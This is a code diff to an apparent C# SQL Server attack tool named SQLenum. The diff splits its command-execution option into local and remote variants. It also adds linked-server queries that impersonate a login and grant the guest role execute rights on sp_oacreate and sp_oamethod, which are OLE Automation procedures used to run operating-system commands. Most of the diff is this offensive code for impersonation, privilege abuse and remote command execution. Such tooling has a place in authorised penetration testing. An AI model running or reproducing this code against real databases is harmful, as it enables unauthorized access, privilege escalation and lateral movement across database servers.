@@ -21,7 +21,8 @@ namespace SQLenum
                 Console.WriteLine("Options:");
                 Console.WriteLine("--localImpersonation=[username] : Local impersonation, default value is sa;");
                 Console.WriteLine("--remoteImpersonation=[username] : Remote impersonation, default value is sa;");
-                Console.WriteLine("--execute=[commands] : Remote command execution;");
+                Console.WriteLine("--localExecute=[commands] : Remote command execution;");
+                Console.WriteLine("--remoteExecute=[commands] : Remote command execution;");
                 Console.WriteLine("--debug : Enable debug mode;");
                 return;
             }
@@ -36,7 +37,8 @@ namespace SQLenum
             Boolean linkEnumeration = false;
             Boolean localImpersonation = false;
             Boolean remoteImpersonation = false;
-            Boolean commandExecution = false;
+            Boolean localCommandExecution = false;
+            Boolean remoteCommandExecution = false;
             Boolean debug = false;
 
             foreach (string arg in args)
@@ -57,11 +59,17 @@ namespace SQLenum
                 {
                     debug = true;
                 }
-                else if (arg.StartsWith("--execute="))
+                else if (arg.StartsWith("--localExecute="))
                 {
                     string[] components = arg.Split('=');
                     remoteCommands = components[1];
-                    commandExecution = true;
+                    localCommandExecution = true;
+                }
+                else if (arg.StartsWith("--remoteExecute="))
+                {
+                    string[] components = arg.Split('=');
+                    remoteCommands = components[1];
+                    remoteCommandExecution = true;
                 }
             }
 
@@ -383,7 +391,7 @@ namespace SQLenum
             }
             reader.Close();
 
-            if (commandExecution == true)
+            if (localCommandExecution == true)
             {
                 try
                 {
@@ -530,7 +538,7 @@ namespace SQLenum
                             Console.WriteLine("[Error]" + e.Message);
                             Console.WriteLine("clr strict security status checking failed");
                         }
-                        if (commandExecution == true)
+                        if (remoteCommandExecution == true)
                         {
                             try
                             {
@@ -877,7 +885,7 @@ namespace SQLenum
                             Console.WriteLine("clr strict security checking failed");
                         }
 
-                        if (commandExecution == true)
+                        if (remoteCommandExecution == true)
                         {
                             try
                             {
@@ -1018,6 +1026,32 @@ namespace SQLenum
                                 Console.WriteLine("User [" + reader[0] + "] is a member of [" + reader[1] + "] role on " + args[1]);
                             }
                             reader.Close();
+
+                            try
+                            {
+                                String enableclr1 = "EXEC ('execute as login = ''" + remoteImpersonatedLogin + "''; grant exec on sp_oacreate to guest;') AT " + args[1] + ";";
+                                command = new SqlCommand(enableclr1, con);
+                                reader = command.ExecuteReader();
+                                reader.Close();
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[Error]" + e.Message);
+                                Console.WriteLine("Grant sp_oacreate failed");
+                            }
+
+                            try
+                            {
+                                String enableclr1 = "EXEC ('execute as login = ''" + remoteImpersonatedLogin + "''; grant exec on sp_oamethod to guest;') AT " + args[1] + ";";
+                                command = new SqlCommand(enableclr1, con);
+                                reader = command.ExecuteReader();
+                                reader.Close();
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[Error]" + e.Message);
+                                Console.WriteLine("Grant sp_oamethod failed");
+                            }
 
                         }
                         catch (Exception e)
@@ -1240,7 +1274,7 @@ namespace SQLenum
                             Console.WriteLine("clr strict security checking failed");
                         }
 
-                        if (commandExecution == true)
+                        if (remoteCommandExecution == true)
                         {
                             try
                             {
@@ -1380,7 +1414,7 @@ namespace SQLenum
                             Console.WriteLine("[Error]"+e.Message);
                             Console.WriteLine("clr strict security status checking failed");
                         }
-                        if(commandExecution == true)
+                        if(remoteCommandExecution == true)
                         {
                             try
                             {
